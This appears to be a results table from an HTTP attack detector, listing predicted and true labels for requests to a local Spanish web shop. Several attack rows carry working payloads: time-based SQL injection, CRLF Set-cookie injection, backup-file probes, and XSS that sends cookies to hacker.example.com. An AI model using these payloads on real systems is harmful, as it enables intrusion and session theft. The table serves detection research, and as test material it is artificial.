Prediction, Actual, Confidence, Method, Content, URL
0, 0, 66.79%, POST, modo=insertar&precio=6212&B1=Confirmar, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0, 0, 99.52%, GET, , http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
0, 0, 99.95%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1, 1, 94.48%, GET, , http://localhost:8080/tienda1/index.jsp.bak HTTP/1.1
1, 1, 99.98%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp/4861362529278789730.old HTTP/1.1
0, 0, 99.95%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1, 0, 53.13%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chihung&password=97lea0&nombre=Caleb&apellidos=Moscoso+Danot&email=mike-osbourne%40hiperzaragoza.qa&dni=41910864B&direccion=Plza.+Musico+Diaz+Cano+5%2C+&ciudad=Espronceda&cp=16144&provincia=Burgos&ntc=4646925880970082&B1=Registrar HTTP/1.1
0, 0, 62.55%, POST, modo=entrar&login=slozil&pwd=ULc0r81A&remember=on&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0, 0, 99.79%, GET, , http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1, 1, 99.99%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp/asf-logo-wide.gif/ HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
0, 0, 97.94%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1
1, 1, 98.86%, GET, , http://localhost:8080/tienda1/imagenes/logo.gif/4861362529278789730.old HTTP/1.1
1, 1, 83.45%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%2B&precio=8459&B1=Confirmar HTTP/1.1
0, 0, 99.76%, GET, , http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1, 1, 99.13%, POST, errorMsgA=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0, 0, 66.69%, POST, modo=registro&login=raddie&password=arquitect%F3nico&nombre=Vinko&apellidos=Monzon%EDs+Cambeiro&email=goth-komarov%40frenchpolynesia.com.mg&dni=28174560C&direccion=Fernandez+Alvarado+78+&ciudad=Puente+de+G%E9nave&cp=44650&provincia=Guip%FAzcoa&ntc=9370319487845203&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 98.61%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
0, 1, 64.82%, GET, , http://localhost:8080/e2ePortalProject/Login.portal HTTP/1.1
1, 0, 68.34%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shuman6&password=zool%F37IC1&nombre=Gisela&apellidos=Boccaccini+Basart&email=butalov0%40lettere.dm&dni=61323691X&direccion=Alfredo+Calderon+136+&ciudad=Poblaci%F3n+de+Arroyo&cp=10817&provincia=Burgos&ntc=8833519281549056&B1=Registrar HTTP/1.1
0, 0, 99.95%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0, 0, 99.86%, GET, , http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
0, 0, 97.94%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
1, 1, 100.00%, POST, id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 1, 66.80%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=schloboh&password=e229dado&nombre=Ce-lso&apellidos=Cresp%ED+Zarzosa&email=lune-dulier%40natravea.py&dni=51098953Z&direccion=Av.+Pedro+Mata%2C+S%2FN+8%3FF&ciudad=Ataun&cp=24367&provincia=%C1vila&ntc=2333052430103872&B1=Registrar HTTP/1.1
0, 0, 94.43%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
0, 0, 67.57%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6188&B1=Pasar+por+caja HTTP/1.1
0, 0, 99.66%, GET, , http://localhost:8080/tienda1/index.jsp HTTP/1.1
1, 1, 97.78%, GET, , http://localhost:8080/databasenotes.html HTTP/1.1
0, 0, 99.98%, GET, , http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1, 1, 100.00%, POST, modo=registro&login=radomir8&password=potajera&nombre=Aim%E9&apellidos=Fadul+Lude%F1as&email=houseman%40sitienesunawebtienesunnegocio.io&dni=97675447J&direccion=Pla%E7a+Gramatics%2C+3%2C+&ciudad=Valverde+del+Camino&cp=10133any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&provincia=%C1vila&ntc=7141808491932190&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 0, 95.90%, POST, errorMsg=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1, 1, 98.61%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
1, 1, 100.00%, POST, id=2&nombre=Jam%F3n+Ib%E9rico&precio=100any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&cantidad=47&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0, 0, 96.96%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1, 1, 65.58%, POST, modo=registro&login=felicity&password=bo9510c8951vo&nombre=Deodato&apellidos=Treig+Bonitto&email=roo%40didacramirez.kn&dni=42952758M&direccion=Lora+64%2C+&ciudad=Villanueva+de+Teba&cpA=43884&provincia=Valladolid&ntc=8769540261854446&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 99.93%, GET, , http://localhost:8080/tienda1/global/asf-logo-wide.gif/~ HTTP/1.1
1, 1, 99.99%, GET, , http://localhost:8080/tienda1/publico/asf-logo-wide.gif HTTP/1.1
0, 0, 99.95%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0, 0, 99.75%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1, 1, 93.96%, POST, modo=registro&login=jamilah&password=e0f2n87a&nombre=Virma&apellidos=Duch+Vilarnau&email=rosamond_aloyshina%40videospornocaseros.aq&dni=84711932B&direccion=Alfredo+Donay+178%2C+&ciudad=Casas+del+Monte&cp=17650&provincia=Za.%2Fragoza&ntc=7712379186246495&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 87.48%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=61&B1A=A%F1adir+al+carrito HTTP/1.1
0, 0, 99.79%, GET, , http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1, 1, 99.96%, POST, errorMsg=Credenciales+incorrectasSet-cookie%253A%2BTamper%253D1041264011025374727, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1, 1, 98.13%, POST, idA=1, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0, 0, 99.79%, GET, , http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
0, 0, 99.98%, GET, , http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
0, 0, 99.98%, GET, , http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
1, 0, 69.18%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=netty9&password=a3uI11d&nombre=Shahir&apellidos=Vieites+Kerber&email=dumeniaud%40lamejorplaya.tn&dni=68370047V&direccion=Comandante+Paz+Varela%2C+38%2C+&ciudad=Cubas+de+la+Sagra&cp=12185&provincia=Zaragoza&ntc=3154021344584169&B1=Registrar HTTP/1.1
1, 1, 95.92%, POST, id=3&nombre=Jam%F3n+Ib%E9rico&precioA=39&cantidad=17&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 1, 95.00%, POST, modo=registro&login=nitin&password=r4mitir&nombre=Lionel&apellidos=Teixidor+Modrego&email=creach%40vindexexpo.gr&dniA=37118814B&direccion=C%2F+Joaquin+Arjona+70%2C+&ciudad=Rionegro+del+Puente&cp=49639&provincia=Barcelona&ntc=8651464575981410&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 65.68%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=noami&pwd=eQuIvaleNtemEntE&remember=off&B1=Entrar HTTP/1.1
0, 0, 65.50%, POST, modo=registro&login=bradney4&password=t31331&nombre=Anuar&apellidos=Retuerta+Fong&email=strucak%40cortell.cat&dni=65651817L&direccion=Poblado+De+Regulares+180%2C+1D&ciudad=Castro+de+Rei&cp=05659&provincia=Lleida&ntc=6974700055894599&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 99.75%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
1, 1, 92.08%, POST, id=2&nombreA=Vino+Rioja&precio=85&cantidad=61&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 1, 81.56%, POST, modo=registro&login=kapil&password=cAR1%2F95Gr74O&nombre=Berina+del+Valle&apellidos=Artico&email=meunier.langa%40tintasultravioleta.al&dni=17826694S&direccion=C%2F+Historiador+Rodrigo+Pertegas%2C+149%2C+8-E&ciudad=Palafolls&cp=25218&provincia=C%E1ceres&ntc=3256313581077416&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 0, 66.61%, POST, modo=registro&login=jamaly&password=retorta&nombre=Leonella&apellidos=Bonilla+Balac&email=ostyn.martan%40icodea.lu&dni=30599008S&direccion=Calle+Marino+Cervera%2C+173%2C+&ciudad=Paracuellos+de+Jarama&cp=09390&provincia=Teruel&ntc=4422802563710608&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 0, 67.57%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4743&B1=Pasar+por+caja HTTP/1.1
1, 1, 93.63%, POST, modo=insertar&precio=715&B1A=Pasar+por+caja, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1, 1, 83.91%, POST, modo=registro&login=melany9&password=imperturbablemente&nombre=Auberto&apellidos=Carabelli+Larra%F1aga&email=ansel%40barebackespa%F1a.lv&dni=42519552G&direccion=C%2F+Echeto+38%2C+&ciudad=Biel&cp=22439&provincia=M.adrid&ntc=6099378900535506&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 97.94%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
1, 1, 99.97%, POST, id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=%22+AND+%221%22%3D%221&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 99.95%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0, 0, 99.81%, GET, , http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
1, 1, 99.85%, GET, , http://localhost:8080/4861362529278789730~ HTTP/1.1
1, 1, 88.31%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100%2F&cantidad=70&B1=A%F1adir+al+carrito HTTP/1.1
1, 1, 91.99%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=delcine3&pwd=af73o76fad8&remember=off&B1=Entrar HTTP/1.1
1, 1, 98.61%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
0, 0, 65.35%, POST, modo=entrar&login=tobias5&pwd=desca.der9r&remember=off&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=laforgesessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&pwd=o1R8me956&remember=off&B1=Entrar HTTP/1.1
1, 0, 54.14%, POST, modo=registro&login=kurt&password=9ig7a2i4&nombre=Jezabel&apellidos=Conocc&email=rummel%40acch-portugal.ni&dni=51178304S&direccion=C%2F+Hortensia+48%2C+&ciudad=Juzbado&cp=18310&provincia=Le%F3n&ntc=6179809121531443&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 80.45%, POST, modo=registro&login=career&password=tel%E9grafo&nombre=Alexia&apellidos=De+Castro+W%F6lker&email=men%40g%40%40943.ch&dni=63653644V&direccion=Sanlucar+La+Mayor%2C+148%2C+&ciudad=Atzeneta+del+Maestrat&cp=16270&provincia=Ciudad+Real&ntc=5906206602610899&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 99.81%, GET, , http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
0, 0, 87.46%, POST, id=2, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0, 0, 99.98%, GET, , http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
1, 1, 68.33%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=april%2C1&password=festero&nombre=Cassandra&apellidos=Bakero&email=suleiman_bergstrom%40magichobby.np&dni=78556514Z&direccion=Calle+Seguirillas+127%2C+12%3FD&ciudad=Vadillo+de+la+Sierra&cp=20740&provincia=Palencia&ntc=9716883753847934&B1=Registrar HTTP/1.1
1, 1, 99.76%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
0, 0, 55.89%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=willie51&password=acampo&nombre=Te%F3filo&apellidos=Zurbar%E1n+Benedi&email=piggot%40necesitouncredito.np&dni=45699398P&direccion=Codigo+Correspondencia+Oficial+Correos-telegrafos+86%2C+&ciudad=Casarabonela&cp=15318&provincia=Burgos&ntc=5568778491902564&B1=Registrar HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0, 0, 94.43%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
0, 0, 94.43%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
1, 1, 99.91%, GET, , http://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide.gif~ HTTP/1.1
0, 0, 99.81%, GET, , http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
0, 0, 96.96%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rajan&password=paLmear&nombre=Amparo&apellidos=Martin+Bansells&email=hampden-baker8%40unidadesdeventilacion.cy&dni=48800601Y&direccion=Calle+Formentera%2C+184+4-C&ciudad=San+Garc%EDa+de+Ingelmos&cp=37129&provincia=Burgos&ntc=1524098225377304&B1=Registrarbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org HTTP/1.1
0, 0, 62.94%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=allis&pwd=De47aducha&remember=on&B1=Entrar HTTP/1.1
0, 0, 99.66%, GET, , http://localhost:8080/tienda1/index.jsp HTTP/1.1
0, 0, 99.98%, GET, , http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
1, 1, 92.41%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=knobloch6&password=B5i230a&nombre=Nahuel&apellidos=Arbona+Yaz%E1n&email=bruck7%40introito.cg&dni=85294407B&direccion=Pl.+La+Se%F1oria%2C+192+12E&ciudad=Valverde+del+Camino&cp=33746&provincia=Lleida&ntcA=7752606383220025&B1=Registrar HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
1, 1, 81.05%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidadA=36&B1=A%F1adir+al+carrito HTTP/1.1
